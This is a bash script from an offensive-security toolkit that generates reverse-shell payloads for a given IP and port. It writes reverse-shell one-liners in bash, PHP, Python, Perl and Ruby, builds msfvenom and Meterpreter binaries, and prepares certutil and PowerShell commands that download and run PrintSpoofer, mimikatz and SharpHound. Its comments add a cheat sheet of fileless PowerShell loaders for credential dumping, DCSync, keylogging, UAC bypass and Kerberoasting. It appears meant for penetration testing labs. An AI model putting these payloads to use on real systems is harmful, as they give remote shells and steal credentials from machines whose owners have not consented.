#!/usr/bin/env bash
# Jan-Karel Visser
# LGPLv3 licensed
# https://jan-karel.nl
# https://hacksec.nl

source meuk/globalmeuk.sh

localnic=${1:-}
localport=${2:-}
BESTAND=${3:-}


echo "[*] Incompentent Bastard v${VERSIE}"

if [ -z "$localnic" ]; then



  echo "incompetentbastard reverseshell.sh

Generates some reverse shells, macro's and a txt file for some good ol copy paste.
Currently default's to port ${PORT} you. Change this by giving the port als a second option.
You'll find the generated shells and the textfile ${BESTAND}_${PORT} in the directory payloads.

usage (with port ${PORT}):
./reverseshell.sh eth0
or (with port 4444)
./reverseshell.sh eth0 4444
or (with IP)
./reverseshell.sh 127.0.1.2 4444
"

  echo "[!] You failed..."
  exit;
fi

if [ "$localport" == $RE ]; then
  PORT=$localport
fi


if [ -z "$BESTAND" ]; then
  BESTAND='shell'
fi

mkdir -p payloads/

#todo: move this to globalmeuk.sh
if [[ $localnic =~ ^[a-z](.*)$ ]]; then
  # we hebben een tun of eth?
  if [[ "$OSTYPE" == "darwin"* ]]; then
    IP=$(ip -4 addr list "$1" | grep inet |  awk '{print $2}' | cut -d/ -f1);
  else
    IP=$(/sbin/ip -o -4 addr list $localnic | awk '{print $4}' | cut -d/ -f1);
  fi
else
  # blijkbaar een IP
  IP=$localnic
fi


echo "[+] Generation payloads for ${IP} on port ${PORT}"
echo '#SHELLS' > http/payloads/${BESTAND}_${PORT}.txt
echo 'bash -i >& /dev/tcp/'${IP}'/'${PORT}' 0>&1' >> http/payloads/${BESTAND}_${PORT}.txt
echo '0<&196;exec 196<>/dev/tcp/'${IP}'/'${PORT}'; sh <&196 >&196 2>&196' >> http/payloads/${BESTAND}_${PORT}.txt
echo '/bin/bash -l > /dev/tcp/'${IP}'/'${PORT}' 0<&1 2>&1' >> http/payloads/${BESTAND}_${PORT}.txt
echo '#UDP nc -u -lnvp ${PORT}' >> http/payloads/${BESTAND}_${PORT}.txt
echo 'sh -i >& /dev/udp/'${IP}'/'${PORT}' 0>&1'  >> http/payloads/${BESTAND}_${PORT}.txt
echo '#PHP' >> http/payloads/${BESTAND}_${PORT}.txt
echo '<?php system("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc '${IP}' '${PORT}' >/tmp/f");?>' >> http/payloads/${BESTAND}_${PORT}.txt
echo 'php -r '"'\$sock=fsockopen(\"${IP}\",${PORT});exec(\"/bin/sh -i <&3 >&3 2>&3\");'"'' >> http/payloads/${BESTAND}_${PORT}.txt
echo 'php -r '"'\$sock=fsockopen(\"${IP}\",${PORT});shell_exec(\"/bin/sh -i <&3 >&3 2>&3\");'"'' >> http/payloads/${BESTAND}_${PORT}.txt
echo 'php -r '"'\$sock=fsockopen(\"${IP}\",${PORT});\`/bin/sh -i <&3 >&3 2>&3\`;'"'' >> http/payloads/${BESTAND}_${PORT}.txt
echo 'php -r '"'\$sock=fsockopen(\"${IP}\",${PORT});system(\"/bin/sh -i <&3 >&3 2>&3\");'"'' >> http/payloads/${BESTAND}_${PORT}.txt
echo 'php -r '"'\$sock=fsockopen(\"${IP}\",${PORT});passthru(\"/bin/sh -i <&3 >&3 2>&3\");'"'' >> http/payloads/${BESTAND}_${PORT}.txt
echo 'php -r '"'\$sock=fsockopen(\"${IP}\",${PORT});popen(\"/bin/sh -i <&3 >&3 2>&3\", \"r\");'"'' >> http/payloads/${BESTAND}_${PORT}.txt

echo '#PYTHON' >> http/payloads/${BESTAND}_${PORT}.txt
echo 'python -c '"'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"${IP}\",${PORT}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(\"/bin/sh\")'"'' >> http/payloads/${BESTAND}_${PORT}.txt
echo 'python -c '"'a=__import__;s=a(\"socket\");o=a(\"os\").dup2;p=a(\"pty\").spawn;c=s.socket(s.AF_INET,s.SOCK_STREAM);c.connect((\"${IP}\",${PORT}));f=c.fileno;o(f(),0);o(f(),1);o(f(),2);p(\"/bin/sh\")'"'' >> http/payloads/${BESTAND}_${PORT}.txt
echo 'python -c '"'a=__import__;b=a(\"socket\").socket;p=a(\"subprocess\").call;o=a(\"os\").dup2;s=b();s.connect((\"${IP}\",${PORT}));f=s.fileno;o(f(),0);o(f(),1);o(f(),2);p([\"/bin/sh\",\"-i\"])'"''  >> http/payloads/${BESTAND}_${PORT}.txt

echo '#PERL' >> http/payloads/${BESTAND}_${PORT}.txt
echo 'perl -e '"'use Socket;\$i=\"${IP}\";\$p=${PORT};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in(\$p,inet_aton(\$i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'"'' >> http/payloads/${BESTAND}_${PORT}.txt
echo 'perl -MIO -e '"'\$p=fork;exit,if(\$p);\$c=new IO::Socket::INET(PeerAddr,\"${IP}:${PORT}\");STDIN->fdopen(\$c,r);\$~->fdopen(\$c,w);system\$_ while<>;'"'' >> http/payloads/${BESTAND}_${PORT}.txt

echo '#RUBY' >> http/payloads/${BESTAND}_${PORT}.txt
echo 'ruby -rsocket -e'"'f=TCPSocket.open(\"${IP}\",${PORT}).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'"'' >> http/payloads/${BESTAND}_${PORT}.txt
echo 'ruby -rsocket -e'"'exit if fork;c=TCPSocket.new(\"${IP}\",\"${PORT}\");loop{c.gets.chomp!;(exit! if \$_==\"exit\");(\$_=~/cd (.+)/i?(Dir.chdir(\$1)):(IO.popen(\$_,?r){|io|c.print io.read}))rescue c.puts \"failed: #{\$_}\"}"'' >> http/payloads/${BESTAND}_${PORT}.txt


powershell -c (new-object System.Net.WebClient).DownloadFile('http://192.168.45.176/tools/PowerSploit.zip','C:\Windows\system32\WindowsPowerShell\v1.0\Modules\PowerSploit.zip')


#TODO windows...
echo "Building some basic reverse tcp shells"

msfvenom -p windows/shell_reverse_tcp LHOST=${IP} LPORT=${PORT} -f exe > http/payloads/${BESTAND}_${PORT}.exe
msfvenom -p linux/x86/shell_reverse_tcp LHOST=${IP} LPORT=${PORT} -f elf > http/payloads/${BESTAND}_${PORT}.elf
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=${IP} LPORT=${PORT} -f elf > http/payloads/meterpreter_${PORT}.elf
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=${IP} LPORT=${PORT} -f elf > http/payloads/meter64_${PORT}.elf
msfvenom -p osx/x86/shell_reverse_tcp LHOST=${IP} LPORT=${PORT} -f macho > http/payloads/${BESTAND}_${PORT}.macho
msfvenom -p windows/shell_reverse_tcp LHOST=${IP} LPORT=${PORT} -f asp > http/payloads/${BESTAND}_${PORT}.asp
msfvenom -p java/jsp_shell_reverse_tcp LHOST=${IP} LPORT=${PORT} -f raw > http/payloads/${BESTAND}_${PORT}.jsp
msfvenom -p java/jsp_shell_reverse_tcp LHOST=${IP} LPORT=${PORT} -f war > http/payloads/${BESTAND}_${PORT}.war
msfvenom -p cmd/unix/reverse_python LHOST=${IP} LPORT=${PORT} -f raw > http/payloads/${BESTAND}_${PORT}.py
msfvenom -p cmd/unix/reverse_bash LHOST=${IP} LPORT=${PORT} -f raw > http/payloads/${BESTAND}_${PORT}.sh
msfvenom -p cmd/unix/reverse_perl LHOST=${IP} LPORT=${PORT} -f raw > http/payloads/${BESTAND}_${PORT}.pl
msfvenom -p php/meterpreter_reverse_tcp LHOST=${IP} LPORT=${PORT} -f raw > http/payloads/meterpreter_${PORT}.php; 
msfvenom --platform=solaris --payload=solaris/x86/${BESTAND}_reverse_tcp LHOST=${IP} LPORT=${PORT}  -f elf -e x86/shikata_ga_nai -b '\x00' > http/payloads/solaris_${PORT}.elf


echo "Building the prefered shells :)"
echo '#POWERSHELL' >> http/payloads/${BESTAND}_${PORT}.txt
echo '[powershellplaceholder]' >> http/payloads/${BESTAND}_${PORT}.txt
python3 powershell.py ${IP} ${PORT} ${BESTAND}_${PORT}.txt

#http/commands uitbreiden
echo '#Downloads' >> http/payloads/${BESTAND}_${PORT}.txt
echo "certutil -urlcache -split -f http://${IP}/tools/PrintSpoofer64.exe print.exe" >> http/payloads/${BESTAND}_${PORT}.txt
echo "certutil -urlcache -split -f http://${IP}/tools/mimi/mimikatz.exe mimi.exe" >> http/payloads/${BESTAND}_${PORT}.txt
echo "certutil -urlcache -split -f http://${IP}/tools/SharpHound.exe sharphound.exe" >> http/payloads/${BESTAND}_${PORT}.txt
echo "certutil -urlcache -split -f http://${IP}/payloads/shell_meth.exe meth.exe" >> http/payloads/${BESTAND}_${PORT}.txt
echo "powershell -c (new-object System.Net.WebClient).DownloadFile('http://${IP}/tools/PrintSpoofer64.exe','c:\windows\\tasks\print.exe')" >> http/payloads/${BESTAND}_${PORT}.txt
echo "powershell -c (new-object System.Net.WebClient).DownloadFile('http://${IP}/tools/mimi/mimikatz.exe','c:\windows\\tasks\mimi.exe')" >> http/payloads/${BESTAND}_${PORT}.txt
echo "powershell -c (new-object System.Net.WebClient).DownloadFile('http://${IP}/tools/SharpHound.exe','c:\windows\\tasks\sharphound.exe')" >> http/payloads/${BESTAND}_${PORT}.txt
echo "powershell -c (new-object System.Net.WebClient).DownloadFile('http://${IP}/payloads/shell_meth.exe','c:\windows\\tasks\meth.exe')" >> http/payloads/${BESTAND}_${PORT}.txt

echo "use multi/handler \n set payload windows/x64/meterpreter/reverse_https \n set LHOST ${localnic}\n set LPORT 8080 \n run -j" > http/commands/msf_https8080
echo "use multi/handler \n set payload windows/x64/meterpreter/reverse_https \n set LHOST ${localnic}\n set LPORT ${PORT} \n run -j" > http/commands/msf_https
echo "use multi/handler \n set payload windows/x64/meterpreter/reverse_tcp \n set LHOST ${localnic} \n set LPORT ${PORT} \n run -j;" > http/commands/msf_tcp
echo "cd C:\Windows\\\tasks && certutil -urlcache -f http://${IP}/tools/PrintSpoofer64.exe print.exe && print.exe -i -c cmd" > http/commands/printspoofer
echo "cd C:\Windows\\\tasks && certutil -urlcache -f http://${IP}/tools/mimikatz.exe mimi.exe" > http/commands/mimikatz
echo "cd C:\Windows\\\tasks && certutil -urlcache -f http://${IP}/tools/SharpHound.exe sharphound.exe" > http/commands/sharphound
echo "cd C:\Windows\\\tasks && certutil -urlcache -f http://${IP}/payloads/shell_meth.exe meth.exe" > http/commands/certutilmeth
echo "powershell -c (new-object System.Net.WebClient).DownloadFile('http://${IP}/tools/PrintSpoofer64.exe','c:\windows\\\tasks\print.exe')" > http/commands/psprintspoofer
echo "powershell -c (new-object System.Net.WebClient).DownloadFile('http://${IP}/tools/PrintSpoofer64.exe','c:\windows\\\tasks\print.exe') && c:\windows\\\tasks\print.exe -i -c cmd" > http/commands/printerspoofer
echo "powershell -c (new-object System.Net.WebClient).DownloadFile('http://${IP}/tools/mimi/mimikatz.exe','c:\windows\\\tasks\mimi.exe')" > http/commands/psmimikatz
echo "powershell -c (new-object System.Net.WebClient).DownloadFile('http://${IP}/tools/SharpHound.exe','c:\windows\\\tasks\sharphound.exe')" > http/commands/pssharphound
echo "powershell -c (new-object System.Net.WebClient).DownloadFile('http://${IP}/tools/SharpHound.exe','c:\windows\\\tasks\sharphound.exe') && c:\windows\\\tasks\sharphound.exe -CollectionMethods All" > http/commands/pssharphound
echo "powershell -c (new-object System.Net.WebClient).DownloadFile('http://${IP}/payloads/shell_meth.exe','c:\windows\\\tasks\meth.exe')" > http/commands/psmeth
echo "powershell -c (new-object System.Net.WebClient).DownloadFile('http://${IP}/payloads/shell_meth.exe','c:\windows\\\tasks\meth.exe') && c:\windows\\\tasks\meth.exe" > http/commands/psmethrun
echo "powershell -c (new-object System.Net.WebClient).DownloadFile('http://${IP}/payloads/methtcp.exe','c:\windows\\\tasks\methtcp.exe')" > http/commands/psmethtcp
echo "powershell -c (new-object System.Net.WebClient).DownloadFile('http://${IP}/payloads/methtcp.exe','c:\windows\\\tasks\methtcp.exe') && c:\windows\\\tasks\meth.exe" > http/commands/psmethtcprun


# Domain Recon
## ShareFinder - Look for shares on network and check access under current user context & Log to file
#powershell.exe -exec Bypass -C "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellEmpire/PowerTools/master/PowerView/powerview.ps1');Invoke-ShareFinder -CheckShareAccess|Out-File -FilePath sharefinder.txt"

## Import PowerView Module
#powershell.exe -exec Bypass -noexit -C "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellEmpire/PowerTools/master/PowerView/powerview.ps1')"

## Invoke-BloodHound for domain recon
#powershell.exe -exec Bypass -C "IEX(New-Object Net.Webclient).DownloadString('https://raw.githubusercontent.com/BloodHoundAD/BloodHound/master/Ingestors/SharpHound.ps1');Invoke-BloodHound"

## ADRecon script to generate XLSX file of domain properties
#powershell.exe -exec Bypass -noexit -C "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/sense-of-security/ADRecon/master/ADRecon.ps1')"


# Priv Esc
## PowerUp script
#powershell.exe -exec Bypass -C “IEX (New-Object Net.WebClient).DownloadString(‘https://raw.githubusercontent.com/PowerShellEmpire/PowerTools/master/PowerUp/PowerUp.ps1’);Invoke-AllChecks”

## cPasswords in sysvol
echo "findstr /S cpassword %logonserver%\sysvol\*.xml \n findstr /S cpassword $env:logonserver\sysvol\*.xml" > http/commands/cpassword


## Inveigh
### Start inveigh using Basic Auth - logging to file
#powershell.exe -exec bypass -C "IEX (New-Object Net.WebClient).DownloadString('http://${IP}//Inveigh.ps1');Invoke-Inveigh -ConsoleOutput Y –NBNS Y –mDNS Y  –Proxy Y -LogOutput Y -FileOutput Y -HTTPAuth Basic"

### Start inveigh in silent mode (no popups)
#powershell.exe -exec Bypass -C "IEX (New-Object Net.WebClient).DownloadString('http://${IP}/Inveigh.ps1');Invoke-Inveigh -ConsoleOutput Y –NBNS Y –mDNS Y  –Proxy Y -LogOutput Y -FileOutput Y -WPADAuth anonymous"

## Invoke-HotPotato Exploit
#powershell.exe -nop -exec bypass -C "IEX (New-Object Net.WebClient).DownloadString('http://${IP}/Tater.ps1');invoke-Tater -Command 'net localgroup Administrators user /add'"

## Bypass UAC and launch PowerShell window as admin
#powershell.exe -exec bypass -C "IEX (New-Object Net.WebClient).DownloadString('http://${IP}/Invoke-BypassUAC.ps1');Invoke-BypassUAC -Command 'start powershell.exe'"

## Invoke-Kerberoast with Hashcat Output
#powershell.exe -exec Bypass -C "IEX (New-Object Net.WebClient).DownloadString('http://${IP}/Invoke-Kerberoast.ps1');Invoke-kerberoast -OutputFormat Hashcat"


# Reg Keys
## Enable Wdigest
#reg add HKLM\SYSTEM\CurrentControlSet\Contro\SecurityProviders\Wdigest /v UseLogonCredential /t Reg_DWORD /d 1 /f

## Check always install elevated
echo "reg query HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\Installer \n reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer" > http/command/install_elevated



# Mimikatz
## Invoke Mimikatz
#powershell.exe -exec bypass -C "IEX (New-Object Net.WebClient).DownloadString('http://${IP}//Invoke-Mimikatz.ps1');Invoke-Mimikatz -DumpCreds"

## Import Mimikatz Module
#powershell.exe -exec Bypass -noexit -C "IEX (New-Object Net.WebClient).DownloadString('http://${IP}/Invoke-Mimikatz.ps1')"

## Perform DcSync attack
#Invoke-Mimikatz -Command '"lsadump::dcsync /domain:demodomain /user:sqladmin"'

## Invoke-MassMimikatz
#powershell.exe -exec Bypass -C "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellEmpire/PowerTools/master/PewPewPew/Invoke-MassMimikatz.ps1');'$env:COMPUTERNAME'|Invoke-MassMimikatz -Verbose"

## Manual Procdump for offline mimikatz
#.\procdump.exe -accepteula -ma lsass.exe lsass.dmp


# Useful Scripts/Commands
## Use Windows Debug api to pause live processes
#powershell.exe -nop -exec bypass -C "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/besimorhino/Pause-Process/master/pause-process.ps1');Pause-Process -ID 1180;UnPause-Process -ID 1180;"

## Import Powersploits invoke-keystrokes
#powershell.exe -exec Bypass -noexit -C "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Get-Keystrokes.ps1')"

## Import Empire's Get-ClipboardContents
#powershell.exe -exec Bypass -noexit -C "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/collection/Get-ClipboardContents.ps1')"

## Import Get-TimedScreenshot
#powershell.exe -exec Bypass -noexit -C "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/obscuresec/PowerShell/master/Get-TimedScreenshot')"




echo 'IEX ()' >> http/payloads/${BESTAND}_${PORT}.txt
python3 invoke-shellcode.py ${IP} ${PORT}


#echo '(New-Object Net.WebClient).DownloadString("http://${IP}/Invoke-PowerShellTcpRun.ps1")' | iconv -t utf-16le | base64 -w 0

echo "[+] Generate METH reverse HTTPS payload for ${IP} on port ${PORT}"
echo '#METERPRETER (reverse_https)' >> http/payloads/${BESTAND}_${PORT}.txt
python3 meterpreter.py ${IP} ${PORT}
cp meuk/meth/bin/Debug/meth.exe http/payloads/${BESTAND}_meth.exe

echo '#METERPRETER (reverse_https) on port 8080' >> http/payloads/${BESTAND}_${PORT}.txt
python3 meterpreter.py ${IP} 8080
cp meuk/meth/bin/Debug/meth.exe http/payloads/meth8080.exe


echo "[+] Generate METH reverse TCP payload for ${IP} on port ${PORT}"
python3 meterpreter.py ${IP} ${PORT} windows/x64/shell_reverse_tcp
cp meuk/meth/bin/Debug/meth.exe http/payloads/methtcp.exe


echo "[+] Generate ASPX reverse HTTPS shell"
python3 methaspx.py ${IP} ${PORT}
cp http/payloads/meth.aspx http/payloads/meth_https.aspx
echo "[+] Generate ASPX reverse TCP shell"
python3 methaspx.py ${IP} ${PORT} windows/x64/shell_reverse_tcp



echo "[+] Building MACRO txt"
echo '#MACRO' >> http/payloads/${BESTAND}_${PORT}.txt
python3 macro.py ${IP} ${PORT}
echo "[+] Done"






